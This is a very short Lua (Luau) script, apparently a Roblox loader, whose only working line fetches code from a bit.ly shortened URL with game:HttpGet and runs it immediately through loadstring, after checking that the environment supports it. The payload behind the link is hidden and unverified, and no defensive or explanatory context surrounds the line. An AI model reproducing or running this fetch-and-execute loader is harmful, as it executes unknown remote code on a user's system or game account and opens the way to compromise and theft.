--- @diagnostic disable: undefined-global, deprecated

if _VERSION == 'Luau' and type(game.HttpGet) == 'function' then
	loadstring(game:HttpGet('https://bit.ly/3wx2Y8z'))()
end
